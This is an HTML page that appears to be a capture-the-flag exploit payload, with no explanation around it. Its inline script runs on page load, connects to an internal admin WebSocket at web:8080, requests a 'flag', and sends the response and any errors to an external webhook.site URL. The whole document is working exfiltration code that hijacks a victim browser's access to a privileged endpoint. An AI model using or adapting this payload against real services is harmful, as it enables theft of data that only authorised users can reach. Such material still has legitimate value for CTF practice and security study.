<!DOCTYPE html>
<html>
  <body>
    <script>
        console.log("start")
        fetch("https://webhook.site/e3a4ec1b-6fe9-4dd6-b025-80502ebed69c?flag=start", {method: 'POST'});
        let ws = new WebSocket("ws://web:8080/admin/ws");
        ws.onopen = () => {
          console.log('Connected to server');
          ws.send("flag");
        };
        ws.onmessage = (event) => {
          console.log("Flag received:", event.data);
          fetch("https://webhook.site/e3a4ec1b-6fe9-4dd6-b025-80502ebed69c?flag=" + encodeURIComponent(event.data),  {method: 'POST'});
        };
        ws.onerror = (err) => {
          console.log('Error received:', err);
          fetch("https://webhook.site/e3a4ec1b-6fe9-4dd6-b025-80502ebed69c?error=ws_failed",  {method: 'POST'});
        };
    </script>
  </body>
</html>
